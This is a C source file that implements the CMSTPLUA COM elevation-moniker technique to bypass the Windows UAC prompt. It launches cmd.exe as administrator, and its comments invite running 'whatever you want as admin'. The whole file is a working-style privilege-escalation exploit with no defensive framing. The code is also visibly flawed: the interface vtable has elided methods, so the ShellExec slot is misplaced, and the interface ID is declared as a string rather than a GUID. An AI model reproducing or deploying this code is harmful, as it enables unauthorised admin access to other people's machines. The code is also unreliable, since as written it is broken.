#include <windows.h>
#include <objbase.h>

typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
    // ... other methods ...
    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
    // ... more methods ...
    END_INTERFACE
} ICMLuaUtilVtbl;

typedef struct ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

#define CLSID_CMSTPLUA L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"  // adjust if needed, some use direct CoCreate

int main() {
    CoInitialize(NULL);
    
    ICMLuaUtil *pLuaUtil = NULL;
    BIND_OPTS3 bo = { sizeof(bo) };
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    
    // Use elevation moniker for auto-elevate
    HRESULT hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", 
                             (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);
    
    if (SUCCEEDED(hr) && pLuaUtil) {
        // Run whatever you want as admin (no UAC prompt)
        pLuaUtil->lpVtbl->ShellExec(pLuaUtil, 
                                    L"C:\\Windows\\System32\\cmd.exe", 
                                    L"/k whoami",   // or any command/parameters
                                    NULL, 
                                    SEE_MASK_DEFAULT, 
                                    SW_SHOW);
        pLuaUtil->lpVtbl->Release(pLuaUtil);
    }
    
    CoUninitialize();
    return 0;
}
